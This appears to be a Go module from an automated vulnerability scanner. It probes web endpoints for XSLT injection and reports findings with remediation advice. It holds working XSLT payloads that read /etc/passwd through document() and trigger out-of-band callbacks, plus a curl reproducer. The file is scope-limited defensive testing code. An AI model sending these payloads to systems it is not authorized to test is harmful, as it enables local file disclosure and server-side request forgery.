package scanner

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"

	"auto-bughunter/backend/internal/model"
	"auto-bughunter/backend/internal/scope"
)

// xsltInjectionMaxAttempts caps the probe budget.
const xsltInjectionMaxAttempts = 6

// xsltKeywords identify candidate endpoints that plausibly perform an XSLT
// transform (as distinct from generic XML parsing, which is covered by
// active_xxe.go).
var xsltKeywords = []string{"xslt", "xsl", "transform", "stylesheet", "render"}

// xsltFileReadPayload embeds a document() call reading a well-known local
// file and echoes it back inside the output. If the target's XSLT processor
// (libxslt, Saxon, Xalan, .NET XslCompiledTransform) evaluates document()
// against attacker-controlled input, the file content is reflected in the
// response.
const xsltFileReadPayload = `<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <abh_probe><xsl:value-of select="document('file:///etc/passwd')"/></abh_probe>
  </xsl:template>
</xsl:stylesheet>`

// xsltOASTPayloadTemplate uses document() with an attacker-controlled HTTP
// URL. Several XSLT processors will dereference an http:// document() URI,
// producing an out-of-band callback that confirms the stylesheet was
// evaluated with attacker control over the document() argument (this is also
// an SSRF primitive independent of file disclosure).
const xsltOASTPayloadTemplate = `<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <abh_probe><xsl:value-of select="document('%%CALLBACK%%')"/></abh_probe>
  </xsl:template>
</xsl:stylesheet>`

// runXSLTInjectionProbe is an active probe for the PayloadsAllTheThings
// "XSLT Injection" technique. Unlike XXE (which abuses DOCTYPE/entity
// declarations), XSLT injection abuses the document() XPath function (and,
// on some engines, extension functions) inside a stylesheet the application
// evaluates against user-controlled or partially-controlled input — for
// example endpoints that accept a custom stylesheet, or that render
// XML+XSLT pairs where the stylesheet parameter is influenced by the
// request.
//
// Detection mirrors active_xxe.go's phased approach:
//  1. OAST out-of-band document() dereference (SSRF-style confirmation).
//  2. Reflected local file read via document('file:///etc/passwd').
func (s *Service) runXSLTInjectionProbe(ctx context.Context, input RunInput, body string) []model.Finding {
	if input.Options.PassiveOnly {
		return nil
	}

	candidates := collectXSLTCandidates(input)
	if len(candidates) == 0 {
		return nil
	}

	if input.Emit != nil {
		input.Emit(model.ScanEvent{
			Type:    model.ScanEventCommand,
			Command: fmt.Sprintf("xslt-injection %s", input.Target),
			Message: "Probing XSLT-capable endpoints for document()-based injection",
		})
	}

	type hit struct {
		url       string
		technique string
		evidence  string
		payload   string
		signal    string
		header    http.Header
	}
	var hits []hit
	attempts := 0

	// ── OAST out-of-band document() dereference ────────────────────────────
	if s.oast != nil && s.oast.Configured() {
		tok := s.oast.Issue("", "xslt-injection-probe")
		if tok.CallbackURL != "" {
			oastPayload := strings.ReplaceAll(xsltOASTPayloadTemplate, "%%CALLBACK%%", tok.CallbackURL)
			var probed []string
			for _, ep := range candidates {
				if attempts >= xsltInjectionMaxAttempts {
					break
				}
				if !scope.IsURLInScope(ep, input.Scope) {
					continue
				}
				req, err := http.NewRequestWithContext(ctx, http.MethodPost, ep, bytes.NewBufferString(oastPayload))
				if err != nil {
					continue
				}
				req.Header.Set("Content-Type", "application/xml")
				ApplyAuthProfile(req, input.AuthProfile)
				resp, err := s.doRequestWithRetry(ctx, req, input.Options)
				attempts++
				probed = append(probed, ep)
				if err == nil && resp != nil {
					_ = resp.Body.Close()
				}
			}
			if oastHits := s.oast.Wait(tok.Token, defaultOASTSSRFWait); len(oastHits) > 0 {
				h := oastHits[0]
				triggerURL := ""
				if len(probed) > 0 {
					triggerURL = probed[0]
				}
				hits = append(hits, hit{
					url:       triggerURL,
					technique: "oast-document-dereference",
					payload:   oastPayload,
					evidence: fmt.Sprintf(
						"Inbound %s %s from %s at %s — XSLT processor evaluated document('%s') from a stylesheet, confirming attacker control over document() (probed endpoints: %s)",
						h.Method, h.Path, h.RemoteAddr, h.ReceivedAt.UTC().Format("2006-01-02T15:04:05Z"),
						tok.CallbackURL, strings.Join(limitStrings(probed, 4), ", "),
					),
				})
			}
		}
	}

	// ── Reflected local file read via document() ────────────────────────────
	if len(hits) == 0 {
		for _, ep := range candidates {
			if attempts >= xsltInjectionMaxAttempts {
				break
			}
			if !scope.IsURLInScope(ep, input.Scope) {
				continue
			}
			req, err := http.NewRequestWithContext(ctx, http.MethodPost, ep, bytes.NewBufferString(xsltFileReadPayload))
			if err != nil {
				continue
			}
			req.Header.Set("Content-Type", "application/xml")
			ApplyAuthProfile(req, input.AuthProfile)
			resp, err := s.doRequestWithRetry(ctx, req, input.Options)
			attempts++
			if err != nil || resp == nil {
				continue
			}
			respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
			respHeader := resp.Header
			_ = resp.Body.Close()
			if sig, matched := matchPathTraversalSignature(string(respBody)); matched {
				hits = append(hits, hit{
					url:       ep,
					technique: "reflected-file-read",
					evidence:  fmt.Sprintf("filesystem file content %q observed in response after XSLT document() evaluation", sig),
					payload:   xsltFileReadPayload,
					signal:    sig,
					header:    respHeader,
				})
				break
			}
		}
	}

	if len(hits) == 0 {
		return nil
	}
	first := hits[0]

	var diffOutcome DifferentialReVerifyOutcome
	if first.technique != "oast-document-dereference" {
		baselines, berr := CaptureTwoControlBaselines(ctx, func(bctx context.Context) (BaselineSample, error) {
			return phase1POSTSample(bctx, s, first.url, "application/xml",
				`<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><abh_probe>safe</abh_probe></xsl:template></xsl:stylesheet>`,
				input, 256*1024)
		})
		if berr == nil && phase1BaselineContains(baselines, first.signal) {
			return nil
		}
		diffOutcome = DifferentialReVerify(ctx, DifferentialReVerifyInput{
			ProbeName:       "xslt-injection-probe",
			OriginalPayload: first.payload,
			SafePayload:     `<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><abh_probe>safe</abh_probe></xsl:template></xsl:stylesheet>`,
			Exec: func(dctx context.Context, altPayload string) (*http.Response, []byte, error) {
				req, err := http.NewRequestWithContext(dctx, http.MethodPost, first.url, strings.NewReader(altPayload))
				if err != nil {
					return nil, nil, err
				}
				req.Header.Set("Content-Type", "application/xml")
				ApplyAuthProfile(req, input.AuthProfile)
				resp, err := s.doRequestWithRetry(dctx, req, input.Options)
				if err != nil || resp == nil {
					return nil, nil, err
				}
				body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
				return resp, body, nil
			},
			Oracle: func(_ context.Context, _ string, _ *http.Response, body []byte) (bool, error) {
				_, matched := matchPathTraversalSignature(string(body))
				return matched, nil
			},
		})
		if diffOutcome.Ran && !diffOutcome.Confirmed {
			return nil
		}
	}

	curl := buildCurlReproducer(http.MethodPost, first.url, input.AuthProfile, "application/xml", xsltFileReadPayload)
	finding := model.Finding{
		ID:       "xslt-injection",
		Category: "input-validation",
		Severity: model.SeverityHigh,
		Title:    "XSLT Injection: document() function evaluated with attacker influence",
		Description: "The application evaluates an XSLT stylesheet where the document() XPath function " +
			"resolved an attacker-influenced URI, either reading a local file (disclosed in the response) or " +
			"making an out-of-band network request. XSLT injection can lead to local file disclosure, " +
			"server-side request forgery, and — on processors that expose extension functions " +
			"(e.g. Saxon/Xalan Java extensions, .NET script blocks) — remote code execution.",
		Evidence: first.evidence,
		Recommendation: "Never accept a user-supplied or user-influenced XSLT stylesheet. If stylesheets must be " +
			"parameterised, use a transformer configuration that disables external document access " +
			"(e.g. Java: `TransformerFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` and disable " +
			"the `document()` extension; libxslt: disable network/file access via `xsltSetLoaderFunc`; .NET: use " +
			"`XsltSettings.Default` — never `XsltSettings.TrustedXslt`). Validate stylesheets against a strict " +
			"schema and run the transform in a sandboxed process with no filesystem/network access.",
		Confidence:    0.85,
		AffectedURL:   first.url,
		CWE:           "CWE-611",
		OWASPCategory: "A05:2021 - Security Misconfiguration",
		Sources:       []string{"active-scanner", "xslt-injection-probe"},
		PoC:           curl,
		ReproductionSteps: []string{
			fmt.Sprintf("Send a POST to %s with Content-Type: application/xml and an XSLT stylesheet whose template calls document('file:///etc/passwd').", first.url),
			"Observe the file content reflected in the transform output, or monitor an OAST listener for an inbound request confirming document() dereferenced an attacker-controlled URL.",
		},
		BusinessTags: []string{"xslt-injection", "xxe-adjacent", "ssrf"},
		EvidenceFields: map[string]string{
			"validationType": "active-probe",
			"technique":      first.technique,
			"evidenceDetail": first.evidence,
			"curlReproducer": curl,
			"responseShape":  ClassifyResponseShape(first.header).String(),
		},
	}
	AttachDifferentialEvidence(&finding, diffOutcome)
	signals := []EvidenceSignal{EvidenceReflection, EvidenceSinkObserved, EvidenceBodyDelta}
	if first.technique == "oast-document-dereference" {
		signals = []EvidenceSignal{EvidenceOASTHit, EvidenceSinkObserved}
	}
	emitted, ok := phase1SubmitVerified(ctx, finding, "xxe", signals, "xslt-injection-probe")
	if !ok {
		return nil
	}
	return []model.Finding{emitted}
}

// collectXSLTCandidates returns candidate POST URLs that plausibly perform an
// XSLT transform: runtime-discovered endpoints whose path contains an XSLT
// keyword, plus common well-known paths appended to the target origin.
func collectXSLTCandidates(input RunInput) []string {
	all := extractRuntimeEndpoints(input.Target, "", input.Scope, 12)
	if len(input.Options.SeedRuntimeEndpoints) > 0 {
		all = append(all, input.Options.SeedRuntimeEndpoints...)
	}
	all = append(all, input.Target)
	all = uniqueEndpoints(all)

	var xsltLike []string
	for _, ep := range all {
		lower := strings.ToLower(ep)
		for _, kw := range xsltKeywords {
			if strings.Contains(lower, kw) {
				xsltLike = append(xsltLike, ep)
				break
			}
		}
	}
	return uniqueEndpoints(xsltLike)
}
